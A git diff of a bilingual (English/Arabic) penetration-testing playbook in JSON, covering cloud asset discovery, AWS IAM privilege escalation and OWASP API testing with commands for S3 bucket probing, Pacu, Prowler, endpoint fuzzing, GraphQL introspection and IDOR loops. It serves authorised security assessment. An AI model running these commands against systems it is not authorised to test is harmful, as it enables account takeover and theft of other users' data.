+              "en": "Formal attestation letter + clean attack machine",
+              "ar": "خطاب شهادة رسمي + جهاز هجوم نظيف"
+            }
           }
         ],
         "tools": [
@@ -1217,79 +2474,163 @@
           "gpg",
           "qpdf"
         ],
-        "deliverable": "Re-test report + attestation letter + signed closure",
-        "tip": "The closure meeting is a sales opportunity. Clients who watched you find and verify fixes are primed for retainer conversations. Come with a proposal."
+        "deliverable": {
+          "en": "Re-test report + attestation letter + signed closure",
+          "ar": "تقرير إعادة اختبار + خطاب شهادة + إغلاق موقّع"
+        },
+        "tip": {
+          "en": "The closure meeting is a sales opportunity. Clients who watched you find and verify fixes are primed for retainer conversations. Come with a proposal.",
+          "ar": "اجتماع الإغلاق فرصة بيع. العملاء الذين شاهدوك تكتشف وتتحقق من الإصلاحات جاهزون لمحادثات العقد الدائم. احضر باقتراح."
+        }
       }
     ]
   },
   {
     "id": "cloud",
-    "label": "Cloud Assessment",
-    "short": "Cloud",
-    "icon": "\u2601\ufe0f",
+    "label": {
+      "en": "Cloud Assessment",
+      "ar": "تقييم السحابة"
+    },
+    "short": {
+      "en": "Cloud",
+      "ar": "سحابة"
+    },
+    "icon": "☁️",
     "color": "#0ea5e9",
-    "desc": "AWS, Azure, GCP misconfigurations, IAM privilege escalation, exposed storage",
+    "desc": {
+      "en": "AWS, Azure, GCP misconfigurations, IAM privilege escalation, exposed storage",
+      "ar": "إعدادات خاطئة في AWS وAzure وGCP، تصعيد صلاحيات IAM، تخزين مكشوف"
+    },
     "steps": [
       {
         "id": "cl1",
-        "title": "Cloud Asset Discovery",
+        "title": {
+          "en": "Cloud Asset Discovery",
+          "ar": "اكتشاف الأصول السحابية"
+        },
         "priority": "high",
-        "summary": "Identify cloud provider, exposed storage, and leaked credentials before touching the environment.",
+        "summary": {
+          "en": "Identify cloud provider, exposed storage, and leaked credentials before touching the environment.",
+          "ar": "تحديد مزوّد الخدمة السحابية، التخزين المكشوف، وبيانات الاعتماد المسرّبة قبل لمس البيئة."
+        },
         "checklist": [
-          "Identify cloud provider from DNS/headers/certificates",
-          "Search for exposed S3/Blob/GCS buckets in OSINT",
-          "Check GitHub/GitLab for leaked cloud credentials",
-          "Enumerate cloud-hosted subdomains",
-          "Check Shodan for cloud metadata endpoints",
-          "Verify bucket enumeration findings via unauthenticated access",
-          "Document all discovered cloud assets"
+          {
+            "en": "Identify cloud provider from DNS/headers/certificates",
+            "ar": "تحديد مزوّد السحابة من DNS/الرؤوس/الشهادات"
+          },
+          {
+            "en": "Search for exposed S3/Blob/GCS buckets in OSINT",
+            "ar": "البحث عن دلاء S3/Blob/GCS مكشوفة في الاستطلاع"
+          },
+          {
+            "en": "Check GitHub/GitLab for leaked cloud credentials",
+            "ar": "فحص GitHub/GitLab بحثاً عن بيانات اعتماد سحابية مسرّبة"
+          },
+          {
+            "en": "Enumerate cloud-hosted subdomains",
+            "ar": "حصر النطاقات الفرعية المستضافة سحابياً"
+          },
+          {
+            "en": "Check Shodan for cloud metadata endpoints",
+            "ar": "فحص Shodan لنقاط نهاية بيانات التعريف السحابية"
+          },
+          {
+            "en": "Verify bucket enumeration findings via unauthenticated access",
+            "ar": "التحقق من نتائج حصر الدلاء عبر وصول غير موثَّق"
+          },
+          {
+            "en": "Document all discovered cloud assets",
+            "ar": "توثيق جميع الأصول السحابية المكتشفة"
+          }
         ],
         "commands": [
           {
             "id": "cl1c1",
-            "title": "S3 Bucket Discovery & Access Test",
-            "purpose": "Find exposed S3 buckets belonging to target org",
+            "title": {
+              "en": "S3 Bucket Discovery & Access Test",
+              "ar": "اكتشاف دلاء S3 واختبار الوصول"
+            },
+            "purpose": {
+              "en": "Find exposed S3 buckets belonging to target org",
+              "ar": "إيجاد دلاء S3 مكشوفة تابعة للمنظمة المستهدفة"
+            },
             "cmd": "# Unauthenticated bucket access:\naws s3 ls s3://{COMPANY}-{SUFFIX} --no-sign-request\n\n# Common suffixes to try:\nfor suffix in backup backups dev prod data logs assets media files; do\n  aws s3 ls s3://{COMPANY}-$suffix --no-sign-request 2>/dev/null && echo \"FOUND: {COMPANY}-$suffix\"\ndone\n\n# Check bucket ACL (is it truly public?):\naws s3api get-bucket-acl --bucket {BUCKET_NAME} --no-sign-request\naws s3api get-bucket-policy --bucket {BUCKET_NAME} --no-sign-request",
             "example": "aws s3 ls s3://acmecorp-backups --no-sign-request",
             "flags": [
               {
                 "f": "--no-sign-request",
-                "d": "Access as anonymous \u2014 tests public buckets"
+                "d": {
+                  "en": "Access as anonymous — tests public buckets",
+                  "ar": "الوصول كمجهول — يختبر الدلاء العامة"
+                }
               },
               {
                 "f": "get-bucket-acl",
-                "d": "Check read/write permissions"
+                "d": {
+                  "en": "Check read/write permissions",
+                  "ar": "فحص صلاحيات القراءة/الكتابة"
+                }
               },
               {
                 "f": "get-bucket-policy",
-                "d": "Read S3 policy for AllUsers grants"
+                "d": {
+                  "en": "Read S3 policy for AllUsers grants",
+                  "ar": "قراءة سياسة S3 لمنح AllUsers"
+                }
               }
             ],
-            "note": "Try: {company}, {company}-backup, {company}-prod, {company}-dev, {company}-data, {company}-logs, {company}-assets",
-            "out": "File listing = exposed. AccessDenied = bucket exists but private. NoSuchBucket = doesn't exist"
+            "note": {
+              "en": "Try: {company}, {company}-backup, {company}-prod, {company}-dev, {company}-data, {company}-logs, {company}-assets",
+              "ar": "جرّب: {company}، {company}-backup، {company}-prod، {company}-dev، {company}-data، {company}-logs، {company}-assets"
+            },
+            "out": {
+              "en": "File listing = exposed. AccessDenied = bucket exists but private. NoSuchBucket = doesn't exist",
+              "ar": "قائمة ملفات = مكشوف. AccessDenied = الدلو موجود لكن خاص. NoSuchBucket = غير موجود"
+            }
           },
           {
             "id": "cl1c2",
-            "title": "Multi-Cloud Audit \u2014 ScoutSuite",
-            "purpose": "Full security posture scan across AWS/Azure/GCP",
+            "title": {
+              "en": "Multi-Cloud Audit — ScoutSuite",
+              "ar": "تدقيق متعدد السحابات — ScoutSuite"
+            },
+            "purpose": {
+              "en": "Full security posture scan across AWS/Azure/GCP",
+              "ar": "فحص شامل لوضع الأمان عبر AWS/Azure/GCP"
+            },
             "cmd": "# AWS:\nscout aws --report-dir ~/pentests/{CLIENT}/cloud/scout-aws/\n\n# Azure (with az cli):\nscout azure --cli --report-dir ~/pentests/{CLIENT}/cloud/scout-azure/\n\n# GCP:\nscout gcp --user-account --report-dir ~/pentests/{CLIENT}/cloud/scout-gcp/\n\n# Open report:\nxdg-open ~/pentests/{CLIENT}/cloud/scout-aws/scoutsuite-report/scoutsuite_results.html",
             "example": "scout aws --report-dir ./scout-output/ --services s3,iam,ec2,rds",
             "flags": [
               {
                 "f": "--services",
-                "d": "Audit specific services only (faster)"
+                "d": {
+                  "en": "Audit specific services only (faster)",
+                  "ar": "تدقيق خدمات محددة فقط (أسرع)"
+                }
               },
               {
                 "f": "--report-dir",
-                "d": "Output directory for HTML report"
+                "d": {
+                  "en": "Output directory for HTML report",
+                  "ar": "مجلد إخراج تقرير HTML"
+                }
               },
               {
                 "f": "--max-workers 4",
-                "d": "Concurrent API calls"
+                "d": {
+                  "en": "Concurrent API calls",
+                  "ar": "استدعاءات API متزامنة"
+                }
               }
             ],
-            "note": "Requires valid cloud credentials. Run with read-only role if grey-box. Full scan takes 10-30 minutes.",
-            "out": "HTML report with 200+ security checks \u2014 IAM, storage, network, encryption, logging"
+            "note": {
+              "en": "Requires valid cloud credentials. Run with read-only role if grey-box. Full scan takes 10-30 minutes.",
+              "ar": "يتطلب بيانات اعتماد سحابية صالحة. شغّله بدور للقراءة فقط إن كان اختبار صندوق رمادي. الفحص الكامل يستغرق 10-30 دقيقة."
+            },
+            "out": {
+              "en": "HTML report with 200+ security checks — IAM, storage, network, encryption, logging",
+              "ar": "تقرير HTML بأكثر من 200 فحص أمني — IAM، التخزين، الشبكة، التشفير، التسجيل"
+            }
           }
         ],
         "tools": [
@@ -1297,67 +2638,145 @@
           "ScoutSuite",
           "subfinder"
         ],
-        "deliverable": "Cloud asset inventory + exposed resources list + credential leak findings",
-        "tip": "Always grep GitHub repos for the company name + 'AKIA' (AWS key prefix). Developers leak cloud keys constantly. One leaked key = full account access."
+        "deliverable": {
+          "en": "Cloud asset inventory + exposed resources list + credential leak findings",
+          "ar": "جرد الأصول السحابية + قائمة الموارد المكشوفة + نتائج تسريب بيانات الاعتماد"
+        },
+        "tip": {
+          "en": "Always grep GitHub repos for the company name + 'AKIA' (AWS key prefix). Developers leak cloud keys constantly. One leaked key = full account access.",
+          "ar": "ابحث دائماً في مستودعات GitHub عن اسم الشركة + 'AKIA' (بادئة مفتاح AWS). المطورون يسرّبون مفاتيح السحابة باستمرار. مفتاح واحد مسرّب = وصول كامل للحساب."
+        }
       },
       {
         "id": "cl2",
-        "title": "IAM Enumeration & Privilege Escalation",
+        "title": {
+          "en": "IAM Enumeration & Privilege Escalation",
+          "ar": "حصر IAM وتصعيد الصلاحيات"
+        },
         "priority": "critical",
-        "summary": "Map all IAM permissions and find escalation paths to admin.",
+        "summary": {
+          "en": "Map all IAM permissions and find escalation paths to admin.",
+          "ar": "رسم خريطة لجميع صلاحيات IAM وإيجاد مسارات التصعيد إلى مدير."
+        },
         "checklist": [
-          "Get current identity: aws sts get-caller-identity",
-          "List all attached policies for current user/role",
-          "Check for iam:PassRole + lambda:CreateFunction combo",
-          "Check for iam:CreatePolicyVersion on managed policies",
-          "Check for iam:AttachUserPolicy on self",
-          "Check for EC2 instance profile with admin rights",
-          "Look for wildcard policies (*:*)",
-          "Run Pacu for automated privilege escalation",
-          "Check cross-account trust relationships"
+          {
+            "en": "Get current identity: aws sts get-caller-identity",
+            "ar": "الحصول على الهوية الحالية: aws sts get-caller-identity"
+          },
+          {
+            "en": "List all attached policies for current user/role",
+            "ar": "سرد جميع السياسات المرفقة بالمستخدم/الدور الحالي"
+          },
+          {
+            "en": "Check for iam:PassRole + lambda:CreateFunction combo",
+            "ar": "فحص تركيبة iam:PassRole + lambda:CreateFunction"
+          },
+          {
+            "en": "Check for iam:CreatePolicyVersion on managed policies",
+            "ar": "فحص iam:CreatePolicyVersion على السياسات المُدارة"
+          },
+          {
+            "en": "Check for iam:AttachUserPolicy on self",
+            "ar": "فحص iam:AttachUserPolicy على النفس"
+          },
+          {
+            "en": "Check for EC2 instance profile with admin rights",
+            "ar": "فحص ملف تعريف مثيل EC2 بصلاحيات مدير"
+          },
+          {
+            "en": "Look for wildcard policies (*:*)",
+            "ar": "البحث عن سياسات بأحرف بدل (*:*)"
+          },
+          {
+            "en": "Run Pacu for automated privilege escalation",
+            "ar": "تشغيل Pacu لتصعيد الصلاحيات الآلي"
+          },
+          {
+            "en": "Check cross-account trust relationships",
+            "ar": "فحص علاقات الثقة عبر الحسابات"
+          }
         ],
         "commands": [
           {
             "id": "cl2c1",
-            "title": "IAM Permission Enumeration",
-            "purpose": "Map exactly what the current credentials can do",
+            "title": {
+              "en": "IAM Permission Enumeration",
+              "ar": "حصر صلاحيات IAM"
+            },
+            "purpose": {
+              "en": "Map exactly what the current credentials can do",
+              "ar": "رسم خريطة دقيقة لما يمكن لبيانات الاعتماد الحالية فعله"
+            },
             "cmd": "# Who am I? (ALWAYS first command):\naws sts get-caller-identity\n\n# List attached policies:\naws iam list-attached-user-policies --user-name {USERNAME}\naws iam list-user-policies --user-name {USERNAME}\naws iam list-groups-for-user --user-name {USERNAME}\n\n# Get policy document (what can I actually do?):\naws iam get-policy-version \\\n  --policy-arn {POLICY_ARN} \\\n  --version-id v1\n\n# Automated enumeration with Pacu:\npython3 pacu.py\n# Pacu commands:\n# > import_keys {PROFILE_NAME}\n# > run iam__enum_permissions\n# > run iam__privesc_scan",
             "example": "aws sts get-caller-identity && aws iam list-attached-user-policies --user-name dev-user",
             "flags": [
               {
                 "f": "iam__enum_permissions",
-                "d": "Pacu: full IAM permission enumeration"
+                "d": {
+                  "en": "Pacu: full IAM permission enumeration",
+                  "ar": "Pacu: حصر شامل لصلاحيات IAM"
+                }
               },
               {
                 "f": "iam__privesc_scan",
-                "d": "Pacu: automated privesc path detection"
+                "d": {
+                  "en": "Pacu: automated privesc path detection",
+                  "ar": "Pacu: كشف آلي لمسارات تصعيد الصلاحيات"
+                }
               }
             ],
-            "note": "Document EVERY permission before attempting escalation. Noisy IAM calls are logged in CloudTrail.",
-            "out": "Full permission list + identified escalation paths"
+            "note": {
+              "en": "Document EVERY permission before attempting escalation. Noisy IAM calls are logged in CloudTrail.",
+              "ar": "وثّق كل صلاحية قبل محاولة التصعيد. استدعاءات IAM الصاخبة تُسجَّل في CloudTrail."
+            },
+            "out": {
+              "en": "Full permission list + identified escalation paths",
+              "ar": "قائمة صلاحيات كاملة + مسارات تصعيد محدَّدة"
+            }
           },
           {
             "id": "cl2c2",
-            "title": "Prowler Compliance & Security Scan",
-            "purpose": "CIS Benchmark, GDPR, HIPAA, SOC2 checks for AWS",
+            "title": {
+              "en": "Prowler Compliance & Security Scan",
+              "ar": "فحص Prowler للامتثال والأمان"
+            },
+            "purpose": {
+              "en": "CIS Benchmark, GDPR, HIPAA, SOC2 checks for AWS",
+              "ar": "فحوصات CIS Benchmark وGDPR وHIPAA وSOC2 لـAWS"
+            },
             "cmd": "# Full compliance scan:\nprowler aws -f {REGION} -M html,json -o ~/pentests/{CLIENT}/cloud/prowler/\n\n# Specific high-value checks:\nprowler aws --checks \\\n  iam_root_mfa_enabled \\\n  iam_user_no_setup_initial_access_key \\\n  s3_bucket_public_access \\\n  ec2_securitygroup_default_restrict_traffic \\\n  cloudtrail_multi_region_enabled\n\n# List all available checks:\nprowler aws --list-checks",
             "example": "prowler aws -f us-east-1 -M html -o ./prowler-output/",
             "flags": [
               {
                 "f": "-M html,json",
-                "d": "Multiple output formats"
+                "d": {
+                  "en": "Multiple output formats",
+                  "ar": "صيغ إخراج متعددة"
+                }
               },
               {
                 "f": "--checks",
-                "d": "Run specific checks only"
+                "d": {
+                  "en": "Run specific checks only",
+                  "ar": "تشغيل فحوصات محددة فقط"
+                }
               },
               {
                 "f": "-f",
-                "d": "AWS region to scan"
+                "d": {
+                  "en": "AWS region to scan",
+                  "ar": "منطقة AWS للفحص"
+                }
               }
             ],
-            "note": "Over 300 checks. CIS, GDPR, PCI-DSS, HIPAA, SOC2 frameworks all supported. Essential for compliance-focused clients.",
-            "out": "Pass/Fail for each control with severity + remediation guidance"
+            "note": {
+              "en": "Over 300 checks. CIS, GDPR, PCI-DSS, HIPAA, SOC2 frameworks all supported. Essential for compliance-focused clients.",
+              "ar": "أكثر من 300 فحص. أطر CIS وGDPR وPCI-DSS وHIPAA وSOC2 جميعها مدعومة. ضروري للعملاء المهتمين بالامتثال."
+            },
+            "out": {
+              "en": "Pass/Fail for each control with severity + remediation guidance",
+              "ar": "نجاح/فشل لكل ضابط مع الخطورة وإرشادات الإصلاح"
+            }
           }
         ],
         "tools": [
@@ -1366,80 +2785,167 @@
           "Prowler",
           "azure-cli"
         ],
-        "deliverable": "IAM privilege escalation paths, compliance report, remediation roadmap",
-        "tip": "iam:PassRole is the #1 AWS privilege escalation path. If you can pass a role with AdministratorAccess to a Lambda function you control, you own the account silently."
+        "deliverable": {
+          "en": "IAM privilege escalation paths, compliance report, remediation roadmap",
+          "ar": "مسارات تصعيد صلاحيات IAM، تقرير امتثال، خارطة طريق الإصلاح"
+        },
+        "tip": {
+          "en": "iam:PassRole is the #1 AWS privilege escalation path. If you can pass a role with AdministratorAccess to a Lambda function you control, you own the account silently.",
+          "ar": "iam:PassRole هو مسار تصعيد الصلاحيات الأول في AWS. إن استطعت تمرير دور بصلاحية AdministratorAccess إلى دالة Lambda تتحكم بها، فأنت تمتلك الحساب بصمت."
+        }
       }
     ]
   },
   {
     "id": "api",
-    "label": "API Security",
-    "short": "API",
-    "icon": "\ud83d\udd0c",
+    "label": {
+      "en": "API Security",
+      "ar": "أمن الواجهات البرمجية"
+    },
+    "short": {
+      "en": "API",
+      "ar": "API"
+    },
+    "icon": "🔌",
     "color": "#a855f7",
-    "desc": "REST, GraphQL, SOAP \u2014 OWASP API Top 10 systematic assessment",
+    "desc": {
+      "en": "REST, GraphQL, SOAP — OWASP API Top 10 systematic assessment",
+      "ar": "REST وGraphQL وSOAP — تقييم منهجي وفق OWASP API Top 10"
+    },
     "steps": [
       {
         "id": "api1",
-        "title": "API Discovery & Mapping",
+        "title": {
+          "en": "API Discovery & Mapping",
+          "ar": "اكتشاف ورسم خريطة API"
+        },
         "priority": "high",
-        "summary": "Enumerate all API endpoints, auth mechanisms, and data flows before testing.",
+        "summary": {
+          "en": "Enumerate all API endpoints, auth mechanisms, and data flows before testing.",
+          "ar": "حصر جميع نقاط نهاية API وآليات المصادقة وتدفقات البيانات قبل الاختبار."
+        },
         "checklist": [
-          "Find Swagger/OpenAPI documentation",
-          "Enumerate endpoints from JS files and responses",
-          "Identify authentication: JWT, OAuth, API key, session",
-          "Find versioned endpoints (v1, v2, v3 \u2014 old versions often less patched)",
-          "Map all HTTP methods per endpoint",
-          "Check for GraphQL introspection",
-          "Identify rate limiting behavior",
-          "Document request/response schemas"
+          {
+            "en": "Find Swagger/OpenAPI documentation",
+            "ar": "البحث عن توثيق Swagger/OpenAPI"
+          },
+          {
+            "en": "Enumerate endpoints from JS files and responses",
+            "ar": "حصر نقاط النهاية من ملفات JS والاستجابات"
+          },
+          {
+            "en": "Identify authentication: JWT, OAuth, API key, session",
+            "ar": "تحديد المصادقة: JWT، OAuth، مفتاح API، جلسة"
+          },
+          {
+            "en": "Find versioned endpoints (v1, v2, v3 — old versions often less patched)",
+            "ar": "إيجاد نقاط نهاية مُرقَّمة بإصدار (v1, v2, v3 — الإصدارات القديمة غالباً أقل تصحيحاً)"
+          },
+          {
+            "en": "Map all HTTP methods per endpoint",
+            "ar": "رسم خريطة جميع طرق HTTP لكل نقطة نهاية"
+          },
+          {
+            "en": "Check for GraphQL introspection",
+            "ar": "فحص تفعيل استبطان GraphQL (introspection)"
+          },
+          {
+            "en": "Identify rate limiting behavior",
+            "ar": "تحديد سلوك تحديد المعدل (rate limiting)"
+          },
+          {
+            "en": "Document request/response schemas",
+            "ar": "توثيق مخططات الطلب/الاستجابة"
+          }
         ],
         "commands": [
           {
             "id": "api1c1",
-            "title": "API Endpoint Discovery",
-            "purpose": "Find all API endpoints via automated and manual techniques",
-            "cmd": "# Extract endpoints from JavaScript files:\ngau {DOMAIN} | grep -iE 'api|/v[0-9]|swagger|openapi|graphql'\n\n# Kiterunner \u2014 API-aware discovery:\nkr scan https://{TARGET}/api/ \\\n  -w ~/tools/kiterunner/routes-large.kite \\\n  -x 20 --fail-status-codes 404,400\n\n# ffuf for API paths:\nffuf -u https://{TARGET}/api/FUZZ \\\n  -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt \\\n  -mc 200,201,204,400,401,403,405 -of csv -o api_endpoints.csv\n\n# Check for documentation:\ncurl -sk https://{TARGET}/swagger.json\ncurl -sk https://{TARGET}/openapi.yaml\ncurl -sk https://{TARGET}/api-docs",
+            "title": {
+              "en": "API Endpoint Discovery",
+              "ar": "اكتشاف نقاط نهاية API"
+            },
+            "purpose": {
+              "en": "Find all API endpoints via automated and manual techniques",
+              "ar": "إيجاد جميع نقاط نهاية API عبر تقنيات آلية ويدوية"
+            },
+            "cmd": "# Extract endpoints from JavaScript files:\ngau {DOMAIN} | grep -iE 'api|/v[0-9]|swagger|openapi|graphql'\n\n# Kiterunner — API-aware discovery:\nkr scan https://{TARGET}/api/ \\\n  -w ~/tools/kiterunner/routes-large.kite \\\n  -x 20 --fail-status-codes 404,400\n\n# ffuf for API paths:\nffuf -u https://{TARGET}/api/FUZZ \\\n  -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt \\\n  -mc 200,201,204,400,401,403,405 -of csv -o api_endpoints.csv\n\n# Check for documentation:\ncurl -sk https://{TARGET}/swagger.json\ncurl -sk https://{TARGET}/openapi.yaml\ncurl -sk https://{TARGET}/api-docs",
             "example": "kr scan https://api.target.com -w routes-large.kite -x 20",
             "flags": [
               {
                 "f": "-x 20",
-                "d": "20 concurrent threads"
+                "d": {
+                  "en": "20 concurrent threads",
+                  "ar": "20 خيط متزامن"
+                }
               },
               {
                 "f": "--fail-status-codes",
-                "d": "Ignore these status codes in results"
+                "d": {
+                  "en": "Ignore these status codes in results",
+                  "ar": "تجاهل رموز الحالة هذه في النتائج"
+                }
               },
               {
                 "f": "-mc",
-                "d": "Match these status codes only (401/403 = endpoint exists but requires auth)"
+                "d": {
+                  "en": "Match these status codes only (401/403 = endpoint exists but requires auth)",
+                  "ar": "مطابقة رموز الحالة هذه فقط (401/403 = نقطة النهاية موجودة لكن تتطلب مصادقة)"
+                }
               }
             ],
-            "note": "401 and 403 responses are valuable finds \u2014 the endpoint exists. 405 = wrong method, try GET/POST/PUT/DELETE.",
-            "out": "Full endpoint inventory with status codes and methods"
+            "note": {
+              "en": "401 and 403 responses are valuable finds — the endpoint exists. 405 = wrong method, try GET/POST/PUT/DELETE.",
+              "ar": "استجابات 401 و403 نتائج قيّمة — نقطة النهاية موجودة. 405 = طريقة خاطئة، جرّب GET/POST/PUT/DELETE."
+            },
+            "out": {
+              "en": "Full endpoint inventory with status codes and methods",
+              "ar": "جرد كامل لنقاط النهاية مع رموز الحالة والطرق"
+            }
           },
           {
             "id": "api1c2",
-            "title": "GraphQL Security Testing",
-            "purpose": "Test introspection, injection, batching, and authorization on GraphQL APIs",
+            "title": {
+              "en": "GraphQL Security Testing",
+              "ar": "اختبار أمان GraphQL"
+            },
+            "purpose": {
+              "en": "Test introspection, injection, batching, and authorization on GraphQL APIs",
+              "ar": "اختبار الاستبطان والحقن والتجميع والتفويض على واجهات GraphQL"
+            },
             "cmd": "# Test if introspection enabled (massive info leak):\ncurl -s -X POST https://{TARGET}/graphql \\\n  -H 'Content-Type: application/json' \\\n  -d '{\"query\":\"{__schema{types{name fields{name}}}}\"}'  \n\n# graphql-cop full audit:\ngraphql-cop -t https://{TARGET}/graphql -v\n\n# Introspection to map all queries/mutations:\npython3 -c \"\nimport requests,json\nr=requests.post('https://{TARGET}/graphql',\n  json={'query':'{__schema{queryType{name}mutationType{name}types{name kind fields{name type{name kind}}}}}'},\n  verify=False)\nprint(json.dumps(r.json(),indent=2))\n\"",
             "example": "graphql-cop -t https://api.target.com/graphql -v -o json",
             "flags": [
               {
                 "f": "__schema",
-                "d": "Full schema introspection \u2014 lists every query, mutation, type"
+                "d": {
+                  "en": "Full schema introspection — lists every query, mutation, type",
+                  "ar": "استبطان كامل للمخطط — يسرد كل استعلام وتحويل ونوع"
+                }
               },
               {
                 "f": "-v",
-                "d": "Verbose output with detailed findings"
+                "d": {
+                  "en": "Verbose output with detailed findings",
+                  "ar": "إخراج تفصيلي مع نتائج مفصّلة"
+                }
               },
               {
                 "f": "-o json",
-                "d": "JSON output for reporting"
+                "d": {
+                  "en": "JSON output for reporting",
+                  "ar": "إخراج JSON للتقارير"
+                }
               }
             ],
-            "note": "Introspection enabled in production = OWASP API9 violation. Gives attacker complete API blueprint.",
-            "out": "All queries/mutations/types if introspection enabled + security issues found"
+            "note": {
+              "en": "Introspection enabled in production = OWASP API9 violation. Gives attacker complete API blueprint.",
+              "ar": "تفعيل الاستبطان في الإنتاج = مخالفة OWASP API9. يمنح المهاجم مخططاً كاملاً لـAPI."
+            },
+            "out": {
+              "en": "All queries/mutations/types if introspection enabled + security issues found",
+              "ar": "جميع الاستعلامات/التحويلات/الأنواع إن كان الاستبطان مُفعَّلاً + مشاكل أمنية مكتشفة"
+            }
           }
         ],
         "tools": [
@@ -1448,64 +2954,142 @@
           "graphql-cop",
           "Burp Suite Pro"
         ],
-        "deliverable": "Complete API inventory with auth mapping and versioning matrix",
-        "tip": "Check old API versions: if /api/v2/users is the current endpoint, /api/v1/users might still work \u2014 and v1 often has weaker authorization."
+        "deliverable": {
+          "en": "Complete API inventory with auth mapping and versioning matrix",
+          "ar": "جرد شامل لـ API مع رسم خريطة المصادقة ومصفوفة الإصدارات"
+        },
+        "tip": {
+          "en": "Check old API versions: if /api/v2/users is the current endpoint, /api/v1/users might still work — and v1 often has weaker authorization.",
+          "ar": "افحص إصدارات API القديمة: إن كانت /api/v2/users هي نقطة النهاية الحالية، فقد يعمل /api/v1/users أيضاً — وغالباً ما يكون v1 أضعف تفويضاً."
+        }
       },
       {
         "id": "api2",
-        "title": "OWASP API Top 10 Assessment",
+        "title": {
+          "en": "OWASP API Top 10 Assessment",
+          "ar": "تقييم OWASP API Top 10"
+        },
         "priority": "critical",
-        "summary": "Systematically test all 10 OWASP API security categories with specific payloads.",
+        "summary": {
+          "en": "Systematically test all 10 OWASP API security categories with specific payloads.",
+          "ar": "اختبار منهجي لجميع فئات أمان API العشر وفق OWASP بحمولات محددة."
+        },
         "checklist": [
-          "API1:2023 BOLA \u2014 Test IDOR on all object IDs (change user ID, order ID, etc.)",
-          "API2:2023 Broken Auth \u2014 Test JWT attacks, weak secrets, missing expiry",
-          "API3:2023 BOPLA \u2014 Mass assignment via extra fields in POST/PUT body",
-          "API4:2023 Resource Consumption \u2014 Rate limiting, no pagination limits",
-          "API5:2023 BFLA \u2014 Access admin-level functions as regular user",
-          "API6:2023 Unrestricted Access \u2014 Business logic bypass",
-          "API7:2023 SSRF \u2014 URL parameters that trigger server-side requests",
-          "API8:2023 Misconfiguration \u2014 CORS, debug endpoints, verbose errors",
-          "API9:2023 Improper Inventory \u2014 Deprecated versions still accessible",
-          "API10:2023 Unsafe API Consumption \u2014 Trust in third-party APIs"
+          {
+            "en": "API1:2023 BOLA — Test IDOR on all object IDs (change user ID, order ID, etc.)",
+            "ar": "API1:2023 BOLA — اختبار IDOR على جميع معرّفات الكائنات (تغيير معرّف المستخدم، الطلب، إلخ)"
+          },
+          {
+            "en": "API2:2023 Broken Auth — Test JWT attacks, weak secrets, missing expiry",
+            "ar": "API2:2023 كسر المصادقة — اختبار هجمات JWT، الأسرار الضعيفة، انتهاء الصلاحية المفقود"
+          },
+          {
+            "en": "API3:2023 BOPLA — Mass assignment via extra fields in POST/PUT body",
+            "ar": "API3:2023 BOPLA — إسناد جماعي عبر حقول إضافية في جسم POST/PUT"
+          },
+          {
+            "en": "API4:2023 Resource Consumption — Rate limiting, no pagination limits",
+            "ar": "API4:2023 استهلاك الموارد — تحديد المعدل، عدم وجود حدود ترقيم الصفحات"
+          },
+          {
+            "en": "API5:2023 BFLA — Access admin-level functions as regular user",
+            "ar": "API5:2023 BFLA — الوصول لوظائف مستوى المدير كمستخدم عادي"
+          },
+          {
+            "en": "API6:2023 Unrestricted Access — Business logic bypass",
+            "ar": "API6:2023 وصول غير مقيّد — تجاوز منطق الأعمال"
+          },
+          {
+            "en": "API7:2023 SSRF — URL parameters that trigger server-side requests",
+            "ar": "API7:2023 SSRF — معاملات رابط تُطلق طلبات من جانب الخادم"
+          },
+          {
+            "en": "API8:2023 Misconfiguration — CORS, debug endpoints, verbose errors",
+            "ar": "API8:2023 إعداد خاطئ — CORS، نقاط نهاية تصحيح، أخطاء مُفصَّلة"
+          },
+          {
+            "en": "API9:2023 Improper Inventory — Deprecated versions still accessible",
+            "ar": "API9:2023 جرد غير صحيح — إصدارات متروكة لا تزال متاحة"
+          },
+          {
+            "en": "API10:2023 Unsafe API Consumption — Trust in third-party APIs",
+            "ar": "API10:2023 استهلاك API غير آمن — الثقة في واجهات برمجية خارجية"
+          }
         ],
         "commands": [
           {
             "id": "api2c1",
-            "title": "BOLA / IDOR Testing (API1)",
-            "purpose": "Access other users objects by manipulating IDs",
+            "title": {
+              "en": "BOLA / IDOR Testing (API1)",
+              "ar": "اختبار BOLA / IDOR (API1)"
+            },
+            "purpose": {
+              "en": "Access other users objects by manipulating IDs",
+              "ar": "الوصول لكائنات مستخدمين آخرين عبر التلاعب بالمعرّفات"
+            },
             "cmd": "# Capture your auth token, then access other users' data:\n\n# Sequential ID test:\nfor id in $(seq 1 100); do\n  curl -s -o /dev/null -w \"%{http_code} $id\\n\" \\\n    -H 'Authorization: Bearer {YOUR_TOKEN}' \\\n    https://{TARGET}/api/v1/users/$id/profile\ndone\n\n# GUID/UUID test (get another user's UUID from any leak):\ncurl -H 'Authorization: Bearer {YOUR_TOKEN}' \\\n  https://{TARGET}/api/v1/orders/{OTHER_USER_UUID}\n\n# Horizontal privilege escalation:\ncurl -H 'Authorization: Bearer {USER_A_TOKEN}' \\\n  https://{TARGET}/api/v1/users/{USER_B_ID}/documents",
             "example": "curl -H 'Authorization: Bearer eyJ...' https://api.target.com/v1/users/1337/profile",
             "flags": [
               {
                 "f": "",
-                "d": "Test numeric IDs, GUIDs, usernames, email as identifiers"
+                "d": {
+                  "en": "Test numeric IDs, GUIDs, usernames, email as identifiers",
+                  "ar": "اختبار جميع طرق HTTP: GET، PUT، DELETE على كائنات مستخدمين آخرين"
+                }
               },
               {
                 "f": "",
-                "d": "Test all HTTP methods: GET, PUT, DELETE on other users objects"
+                "d": {
+                  "en": "Test all HTTP methods: GET, PUT, DELETE on other users objects",
+                  "ar": "اختبار جميع طرق HTTP: GET، PUT، DELETE على كائنات مستخدمين آخرين"
+                }
               }
             ],
-            "note": "BOLA/IDOR is the #1 API vulnerability by frequency. Every object endpoint must be tested.",
-            "out": "200 OK with another users data = Critical BOLA finding"
+            "note": {
+              "en": "BOLA/IDOR is the #1 API vulnerability by frequency. Every object endpoint must be tested.",
+              "ar": "BOLA/IDOR هي ثغرة API الأولى من حيث التكرار. يجب اختبار كل نقطة نهاية كائن."
+            },
+            "out": {
+              "en": "200 OK with another users data = Critical BOLA finding",
+              "ar": "استجابة 200 OK ببيانات مستخدم آخر = نتيجة BOLA حرجة"
+            }
           },
           {
             "id": "api2c2",
